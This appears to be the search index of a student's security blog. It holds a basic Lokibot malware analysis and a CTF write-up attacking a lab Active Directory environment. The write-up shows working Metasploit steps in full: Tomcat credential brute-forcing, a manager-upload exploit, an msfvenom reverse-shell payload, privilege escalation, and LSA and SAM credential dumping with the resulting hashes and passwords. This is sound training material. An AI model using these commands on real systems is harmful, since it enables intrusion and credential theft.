{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome ... I'm a final year student in Bachelor of Computer Science (Hons) Data Communication and Networking (CS245) at UiTM Shah Alam, Selangor. I am currently doing an internship at NetByteSEC Sdn. Bhd in Nilai, Negeri Sembilan. Contact me Email: ahmadafif.work@gmail.com Telegram: Ahmad A'fif","title":"Home"},{"location":"#welcome","text":"I'm a final year student in Bachelor of Computer Science (Hons) Data Communication and Networking (CS245) at UiTM Shah Alam, Selangor. I am currently doing an internship at NetByteSEC Sdn. Bhd in Nilai, Negeri Sembilan.","title":"Welcome ..."},{"location":"#contact-me","text":"Email: ahmadafif.work@gmail.com Telegram: Ahmad A'fif","title":"Contact me"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/","text":"This is basic malware analysis for EXE file, Chake Berberian Order.exe reported by cocaman . The file can be download here . Details \u2014 file $ file Chake Berberian Order.exe Chake Berberian Order.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows It is .NET Assembly , can use ILSpy to analyze it. Hash \u2014 md5sum, sha1sum, sha256sum $ md5sum Chake Berberian Order.exe 989be4c6df52a9ae3ad2f413a024d796 $ sha1sum Chake Berberian Order.exe 740a2d1db5bfdeac9cb0f7640c86761a6f93a805 $ sha256sum Chake Berberian Order.exe da9d5824f98c31b4884a41111309055a5a33b4b1ec2d42bf223cfac782a604dc Compare \u2014 ssdeep $ ssdeep Chake Berberian Order* 12288:3OATB61BkAEwZZ2SuIdeaiFFSXnK7xOu41:a1BkA5EaiFFflOR1, Chake Berberian Order.exe 12288:NOATB61BkAEwZZ2SuIdeaiFFSXnKYL4xOu41:A1BkA5EaiFFfYaOR1, Chake Berberian Order-cleaned.exe *Chake Berberian Order-cleaned.exe is output from de4dot . So I use this file to compare with the actual. Classify \u2014 trid $ trid Chake Berberian Order.exe TrID/32 \u2014 File Identifier v2.24 \u2014 \u00a9 2003\u201316 By M.Pontello Definitions found: 13222 Analyzing\u2026 Collecting data from file: Chake Berberian Order.exe 68.7% (.EXE) Generic CIL Executable (.NET, Mono, etc.) (73123/4/13) 13.2% (.EXE) Win16 NE executable (generic) (14043/9/4) 6.1% (.DLL) Win32 Dynamic Link Library (generic) (6578/25/2) 4.2% (.EXE) Win32 Executable (generic) (4505/5/1) 1.9% (.EXE) OS/2 Executable (generic) (2029/13) Basically it is an EXE file with .NET. Scan \u2014 Jotti Examine \u2014 ILSpy Chake Berberian Order.exe is obfuscated. So I use de4dot to restore the assembly to almost the original one. Output named as Chake Berberian Order-cleaned.exe . Extract and Analyze \u2014 floss Before deobfuscate \u2026 After deobfuscate \u2026 Correlate \u2014 CFF Explorer The main Direct Link Library (DLL) used is mscoree.dll . Research Joe Sandbox Analysis: Verdict: MAL Score: 100/100 Classification: mal100.spyw.evad.winEXE@5/3@0/1 Threat Name: Lokibot Lokibot , Loki PWS and Loki-bot employs Trojan malware to steal sensitive information such as usernames , passwords , cryptocurrency wallets and other credentials . Hosts: 195.69.140.147 HTML Report | PDF Report | Executive Report | Incident Report | IOCs","title":"Chake Berberian Order.exe"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#details-file","text":"$ file Chake Berberian Order.exe Chake Berberian Order.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows It is .NET Assembly , can use ILSpy to analyze it.","title":"Details \u2014 file"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#hash-md5sum-sha1sum-sha256sum","text":"$ md5sum Chake Berberian Order.exe 989be4c6df52a9ae3ad2f413a024d796 $ sha1sum Chake Berberian Order.exe 740a2d1db5bfdeac9cb0f7640c86761a6f93a805 $ sha256sum Chake Berberian Order.exe da9d5824f98c31b4884a41111309055a5a33b4b1ec2d42bf223cfac782a604dc","title":"Hash \u2014 md5sum, sha1sum, sha256sum"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#compare-ssdeep","text":"$ ssdeep Chake Berberian Order* 12288:3OATB61BkAEwZZ2SuIdeaiFFSXnK7xOu41:a1BkA5EaiFFflOR1, Chake Berberian Order.exe 12288:NOATB61BkAEwZZ2SuIdeaiFFSXnKYL4xOu41:A1BkA5EaiFFfYaOR1, Chake Berberian Order-cleaned.exe *Chake Berberian Order-cleaned.exe is output from de4dot . So I use this file to compare with the actual.","title":"Compare \u2014 ssdeep"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#classify-trid","text":"$ trid Chake Berberian Order.exe TrID/32 \u2014 File Identifier v2.24 \u2014 \u00a9 2003\u201316 By M.Pontello Definitions found: 13222 Analyzing\u2026 Collecting data from file: Chake Berberian Order.exe 68.7% (.EXE) Generic CIL Executable (.NET, Mono, etc.) (73123/4/13) 13.2% (.EXE) Win16 NE executable (generic) (14043/9/4) 6.1% (.DLL) Win32 Dynamic Link Library (generic) (6578/25/2) 4.2% (.EXE) Win32 Executable (generic) (4505/5/1) 1.9% (.EXE) OS/2 Executable (generic) (2029/13) Basically it is an EXE file with .NET.","title":"Classify \u2014 trid"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#scan-jotti","text":"","title":"Scan \u2014 Jotti"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#examine-ilspy","text":"Chake Berberian Order.exe is obfuscated. So I use de4dot to restore the assembly to almost the original one. Output named as Chake Berberian Order-cleaned.exe .","title":"Examine \u2014 ILSpy"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#extract-and-analyze-floss","text":"Before deobfuscate \u2026 After deobfuscate \u2026","title":"Extract and Analyze \u2014 floss"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#correlate-cff-explorer","text":"The main Direct Link Library (DLL) used is mscoree.dll .","title":"Correlate \u2014 CFF Explorer"},{"location":"writeup/basic-malware-analysis-chake-berberian-order/#research","text":"Joe Sandbox Analysis: Verdict: MAL Score: 100/100 Classification: mal100.spyw.evad.winEXE@5/3@0/1 Threat Name: Lokibot Lokibot , Loki PWS and Loki-bot employs Trojan malware to steal sensitive information such as usernames , passwords , cryptocurrency wallets and other credentials . Hosts: 195.69.140.147 HTML Report | PDF Report | Executive Report | Incident Report | IOCs","title":"Research"},{"location":"writeup/ctf-round-3-active-directory/","text":"This is a writeup for CTF Round 3\u200a-\u200aActive Directory. In this CTF, there are 4 challenges which are VPN, web server, file server and Domain Controller. Some of the challenges are hard and need to go for experimenting and reading through previous writeup and might find some ideas from there. Note that some of the informations are confidential, therefore I changed a little bit. Challenges\u200a-\u200aVPN Each of the participant given own unique vpn config file. Answer for this challenge is based on the vpn config file. Q1 - VPN configuration Question 1 asking for information about VPN server public ip. Hint said this can be found in the VPN config file. So, I open the config file using my favourite code editor. remote vpn.ctf.xxxxxxxxxx.com 11139 udp While scrolling, I found this line of config included host name, port number and protocol. I copied the host name and ran into WHOIS IP Lookup Tool . Found the IP address 178.XXX.XXX.221. Answer: 178.XXX.XXX.221:udp:11139 Q2 - VPN user network address Question 2 asked for the user network address. To achieve that, I need to connect to the VPN. I ran sudo openvpn vpn_conect.config . Once connection initialized, I ran ifconfig and look for interface name like tunXX . There is the user IP address at the interface. Note that network address is like 10.XXX.XXX.0 . Simply changed it. Answer: 10.0.200.0 Q3\u200a-\u200aChallenge server network address Question 3 asked for the server network address. Hint said I need to use command netstat -rn . I ran the command and get this output. $ netstat -rn Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 192.168.1.1 0.0.0.0 UG 0 0 0 eth0 10.0.200.0 0.0.0.0 255.255.255.0 U 0 0 0 tun0 192.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 192.168.9.0 10.0.200.1 255.255.255.0 UG 0 0 0 tun0 192.168.240.0 10.0.200.1 255.255.255.0 UG 0 0 0 tun0 On interface tun0 , there are 2 network address, 192.168.9.0 and 192.168.240.0 that have flag UG . This flag means that the route is up and point to a gateway. Both address point to 10.0.200.1 which is the gateway. I tested both network address and got the right answer. Answer: 192.168.240.0 Challenges\u200a-\u200aWeb Server To answer this challenge, I need to know the IP address of the web server. I went through the question and found hint on question 6 which stated the ip address 192.168.240.80 . I ran nmap -Pn -A 192.168.240.80 and got something. $ nmap -Pn -A 192.168.9.0/24 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 23:50 +08 Nmap scan report for 192.168.240.80 Host is up (0.16s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp closed http 443/tcp closed https 8080/tcp open http Apache Tomcat 8.5.59 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/8.5.59 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds nmap discovered 3 ports on 192.168.240.80 and only 1 port is open, port 8080 -> Apache Tomcat. Q1\u200a-\u200aUsername and password for webserver 'cat' with name 'tom'. I ran msfconsole and search for specific modules about the Apache Tomcat by using command search tomcat . msf6 > search tomcat Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/ibm_drm_download 2020-04-21 normal Yes IBM Data Risk Manager Arbitrary File Download 1 auxiliary/admin/http/tomcat_administration normal No Tomcat Administration Tool Default Access 2 auxiliary/admin/http/tomcat_utf8_traversal 2009-01-09 normal No Tomcat UTF-8 Directory Traversal Vulnerability 3 auxiliary/admin/http/trendmicro_dlp_traversal 2009-01-09 normal No TrendMicro Data Loss Prevention 5.5 Directory Traversal 4 auxiliary/dos/http/apache_commons_fileupload_dos 2014-02-06 normal No Apache Commons FileUpload and Apache Tomcat DoS 5 auxiliary/dos/http/apache_tomcat_transfer_encoding 2010-07-09 normal No Apache Tomcat Transfer-Encoding Information Disclosure and DoS 6 auxiliary/dos/http/hashcollision_dos 2011-12-28 normal No Hashtable Collisions 7 auxiliary/scanner/http/tomcat_enum normal No Apache Tomcat User Enumeration 8 auxiliary/scanner/http/tomcat_mgr_login normal No Tomcat Application Manager Login Utility 9 exploit/linux/http/cisco_prime_inf_rce 2018-10-04 excellent Yes Cisco Prime Infrastructure Unauthenticated Remote Code Execution 10 exploit/linux/http/cpi_tararchive_upload 2019-05-15 excellent Yes Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability 11 exploit/multi/http/cisco_dcnm_upload_2019 2019-06-26 excellent Yes Cisco Data Center Network Manager Unauthenticated Remote Code Execution 12 exploit/multi/http/struts2_namespace_ognl 2018-08-22 excellent Yes Apache Struts 2 Namespace Redirect OGNL Injection 13 exploit/multi/http/struts_code_exec_classloader 2014-03-06 manual No Apache Struts ClassLoader Manipulation Remote Code Execution 14 exploit/multi/http/struts_dev_mode 2012-01-06 excellent Yes Apache Struts 2 Developer Mode OGNL Execution 15 exploit/multi/http/tomcat_jsp_upload_bypass 2017-10-03 excellent Yes Tomcat RCE via JSP Upload Bypass 16 exploit/multi/http/tomcat_mgr_deploy 2009-11-09 excellent Yes Apache Tomcat Manager Application Deployer Authenticated Code Execution 17 exploit/multi/http/tomcat_mgr_upload 2009-11-09 excellent Yes Apache Tomcat Manager Authenticated Upload Code Execution 18 exploit/multi/http/zenworks_configuration_management_upload 2015-04-07 excellent Yes Novell ZENworks Configuration Management Arbitrary File Upload 19 exploit/windows/http/cayin_xpost_sql_rce 2020-06-04 excellent Yes Cayin xPost wayfinder_seqid SQLi to RCE 20 exploit/windows/http/tomcat_cgi_cmdlineargs 2019-04-10 excellent Yes Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability 21 post/multi/gather/tomcat_gather normal No Gather Tomcat Credentials 22 post/windows/gather/enum_tomcat normal No Windows Gather Apache Tomcat Enumeration I use module 8 to attempt our login to the Tomcat Application Manager. Simply select the module using command use 8 and configured it properly. After that, I ran the module using command exploit . msf6 > use 8 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 192.168.240.80 RHOST => 192.168.240.80 msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [-] 192.168.240.80:8080 - LOGIN FAILED: admin:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:root (Incorrect) [+] 192.168.240.80:8080 - Login Successful: admin:tomcat [-] 192.168.240.80:8080 - LOGIN FAILED: manager:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:owaspbwa (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: xampp:xampp (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Got the valid credential for tomcat ( admin:tomcat ). I login the Tomcat Manager site with the credential and I'm inside! Answer: admin:tomcat Q2\u200a-\u200aMD5 checksum hash for file 'tomcat.ico' Next, I need to gain access to the remote target through the Apache Tomcat service. To do that, I ran use 17 to select module multi/http/tomcat_mgr_upload and configured it properly. Then I ran the exploit. msf6 auxiliary(scanner/http/tomcat_mgr_login) > use 17 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat HttpPassword => tomcat msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername admin HttpUsername => admin msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.240.80 RHOSTS => 192.168.240.80 msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080 RPORT => 8080 msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(multi/http/tomcat_mgr_upload) > exploit [*] Started reverse TCP handler on 10.0.200.2:4444 [*] Retrieving session ID and CSRF token... [*] Uploading and deploying obllDiY... [*] Executing obllDiY... [*] Sending stage (58125 bytes) to 192.168.240.80 [*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.80:57086) at 2020-11-22 00:45:10 +0800 [*] Undeploying obllDiY ... meterpreter > The exploit working and now I have a Meterpreter shell on the remote target. I ran sysinfo to get information about the remote system and getuid to get the user that the server is running as. meterpreter > sysinfo Computer : prod-websrv7765 OS : Windows Server 2012 R2 6.3 (amd64) Meterpreter : java/windows meterpreter > getuid Server username: LOCAL SERVICE Right now, I'm as LOCAL SERVICE . Next, I ran ls to list out the folders and files. meterpreter > ls Listing: C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5 =============================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100776/rwxrwxrw- 58068 fil 2020-10-07 00:58:40 +0800 LICENSE 100776/rwxrwxrw- 1777 fil 2020-10-07 00:58:40 +0800 NOTICE 100776/rwxrwxrw- 7314 fil 2020-10-07 00:58:40 +0800 RELEASE-NOTES 100776/rwxrwxrw- 81704 fil 2020-10-07 00:59:30 +0800 Uninstall.exe 40776/rwxrwxrw- 4096 dir 2020-11-03 08:58:32 +0800 bin 40776/rwxrwxrw- 4096 dir 2020-11-03 09:21:48 +0800 conf 40776/rwxrwxrw- 12288 dir 2020-11-03 08:58:32 +0800 lib 40776/rwxrwxrw- 16384 dir 2020-11-22 00:29:46 +0800 logs 40776/rwxrwxrw- 4096 dir 2020-11-22 00:45:18 +0800 temp 100776/rwxrwxrw- 21630 fil 2020-10-07 00:58:50 +0800 tomcat.ico 40776/rwxrwxrw- 16384 dir 2020-11-22 00:45:15 +0800 webapps 40776/rwxrwxrw- 0 dir 2020-11-18 13:55:43 +0800 work This question ask for MD5 hash for tomcat.ico . To do that, I ran checksum md5 tomcat.ico . meterpreter > checksum md5 tomcat.ico 4644f2d45601037b8423d45e13194c93 tomcat.ico Answer: 4644f2d45601037b8423d45e13194c93 Q3\u200a-\u200aPlain text password for domain user Next, I need to create a windows meterpreter using msfvenom . Simply ran msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe . $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes $ file meterpreter.exe meterpreter.exe: PE32+ executable (GUI) x86-64, for MS Windows Now I have a Windows executable ready to go. Next, I used exploit/multi/handler to handle the exploit launched outside of the framework. I configured the handler exactly same as the configuration I used to create the Windows binary Meterpreter. Then I ran exploit . $ msfconsole -q msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(multi/handler) > set LPORT 5555 LPORT => 5555 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 10.0.200.2:5555 After that, I went back to other Meterpreter. I uploaded the Windows binary, spawned a shell and ran the binary. meterpreter > upload meterpreter.exe [*] uploading : meterpreter.exe -> meterpreter.exe [*] Uploaded -1.00 B of 7.00 KiB (-0.01%): meterpreter.exe -> meterpreter.exe [*] uploaded : meterpreter.exe -> meterpreter.exe meterpreter > shell Process 4 created. Channel 5 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5>meterpreter.exe meterpreter.exe Now I have Windows Meterpreter running. [*] Sending stage (200262 bytes) to 192.168.240.80 [*] Meterpreter session 1 opened (10.0.200.2:5555 -> 192.168.240.80:57639) at 2020-11-22 01:47:30 +0800 meterpreter > Right now, I'm NT AUTHORITY\\LOCAL SERVICE and I need to get NT AUTHORITY\\SYSTEM . To achieve that, here's come privilege escalation. I do some digging and found module post/multi/recon/local_exploit_suggester . This module suggested local meterpreter exploits that can be used. I ran background and use post/multi/recon/local_exploit_suggester . I configured it with session 1 and ran the module. meterpreter > background [*] Backgrounding session 1... msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1 SESSION => 1 msf6 post(multi/recon/local_exploit_suggester) > run [*] 192.168.240.80 - Collecting local exploits for x64/windows... [*] 192.168.240.80 - 20 exploit checks are being tried... [+] 192.168.240.80 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. nil versions are discouraged and will be deprecated in Rubygems 4 [+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. [*] Post module execution completed I give a try to exploit/windows/local/bypassuac_dotnet_profiler . msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_dotnet_profiler [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [*] UAC is Enabled, checking level... [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module [*] Exploit completed, but no session was created. Hurm no luck. Moving on to exploit/windows/local/bypassuac_sdclt . msf6 exploit(windows/local/bypassuac_dotnet_profiler) > use exploit/windows/local/bypassuac_sdclt [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/bypassuac_sdclt) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/bypassuac_sdclt) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [*] UAC is Enabled, checking level... [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module [*] Exploit completed, but no session was created. No luck again. I skipped the other 2 and use exploit/windows/local/ms16_075_reflection_juicy because it said juicy? msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/windows/local/ms16_075_reflection_juicy [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/ms16_075_reflection_juicy) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).) [*] Launching notepad to host the exploit... [+] Process 3056 launched. [*] Reflectively injecting the exploit DLL into 3056... [*] Injecting exploit into 3056... [*] Exploit injected. Injecting exploit configuration into 3056... [*] Configuration injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 192.168.240.80 [*] Meterpreter session 2 opened (10.0.200.2:6666 -> 192.168.240.80:57925) at 2020-11-22 02:19:16 +0800 meterpreter > I'm in as NT AUTHORITY\\SYSTEM . meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM To answer the question, I ran use kiwi to load kiwi module and lsa_dump_secrets to dump LSA secrets. Kiwi module used to perform various types of credential-oriented operations such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and more. meterpreter > use kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x86/windows) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ [!] Loaded x86 Kiwi on an x64 architecture. Success. meterpreter > lsa_dump_secrets [+] Running as SYSTEM [*] Dumping LSA secrets Domain : PROD-WEBSRV7765 SysKey : 14a513800f23074d06b371d5b4bfdb86 Local name : PROD-WEBSRV7765 ( S-1-5-21-1669853405-1314316162-1621276032 ) Domain name : MYCOMS ( S-1-5-21-2804598327-1020562986-2106375421 ) Domain FQDN : mycoms.com.local Policy subsystem is : 1.12 LSA Key(s) : 1, default {623d7843-d8a7-c5a9-01fa-119217f4064e} [00] {623d7843-d8a7-c5a9-01fa-119217f4064e} b45240c17c8897e3d5270783f4cc737f278b68d474c51a505bc077bf2220b1df Secret : $MACHINE.ACC cur/text: WI6$*\\T[fZ%F!qqD%?^U]E\"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^' NTLM:eddb95449e4807dedc0d2ecdbe361719 SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5 old/text: WI6$*\\T[fZ%F!qqD%?^U]E\"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^' NTLM:eddb95449e4807dedc0d2ecdbe361719 SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5 Secret : DefaultPassword Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 d9 d2 0c 8c f2 c0 fe 37 7e 8a 5b f6 a9 38 49 99 8b a6 93 20 b2 9e c0 9d c6 41 5a a6 cc df 31 fd 9b ce 53 ba 1e 8c 31 71 full: d9d20c8cf2c0fe377e8a5bf6a93849998ba69320b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171 m/u : d9d20c8cf2c0fe377e8a5bf6a93849998ba69320 / b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171 old/hex : 01 00 00 00 55 0b 07 be cc e6 4f 90 bb 45 62 4a 4a dc 7f 91 50 a8 90 cc dd dc d2 a3 ce 33 5a 29 49 3d 60 6f 25 a5 03 2e 42 39 b1 96 full: 550b07becce64f90bb45624a4adc7f9150a890ccdddcd2a3ce335a29493d606f25a5032e4239b196 m/u : 550b07becce64f90bb45624a4adc7f9150a890cc / dddcd2a3ce335a29493d606f25a5032e4239b196 Secret : NL$KM cur/hex : 29 5b d7 f4 51 cb 5a 3f e2 9e bb cd 4f 8a 7c 36 d3 31 1e 24 9c 7e a4 da c6 b0 57 78 3e 4b e6 f3 b2 2d fd d8 83 b6 9e 9e f8 fc 13 d3 77 37 e4 7f 8b 6a 7c ad 41 2c 86 06 1c 0d ef 4d 0a c2 e1 59 Secret : _SC_SplunkForwarder / service 'SplunkForwarder' with username : mycoms\\ali cur/text: P@ssw0rd123! The password for domain user is stated there. Answer: P@ssw0rd123! Q4\u200a-\u200aNTLM hash result for user Administrator For this question, I use post/windows/gather/smart_hashdump to dump local accounts from the SAM Database. meterpreter > background [*] Backgrounding session 2... msf6 exploit(windows/local/ms16_075_reflection_juicy) > use post/windows/gather/smart_hashdump msf6 post(windows/gather/smart_hashdump) > set SESSION 2 SESSION => 2 msf6 post(windows/gather/smart_hashdump) > run [*] Running module against PROD-WEBSRV7765 [*] Hashes will be saved to the database if one is connected. [+] Hashes will be saved in loot in JtR password file format to: [*] /home/ahmad/.msf4/loot/20201122030536_default_192.168.240.80_windows.hashes_705427.txt [*] Dumping password hashes... [*] Running as SYSTEM extracting hashes from registry [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 14a513800f23074d06b371d5b4bfdb86... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... [*] No users with password hints on this system [*] Dumping password hashes... [+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: [*] Post module execution completed Now I have the full NTLM hash for Administrator. Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: Q5\u200a-\u200aPlain text password for user Administrator The full NTLM hash consist of 4 parts which are username : relative identifier : LM hash : NT hash :::. To get the password for user Administrator, I need to crack the NT hash using john or crackstation.net . I copied the NT hash and paste it on online tool. Answer: P@ssw0rd Q6\u200a-\u200aDomain User Based on the output of lsa_dump_secrets , the domain user is ali Answer: ali 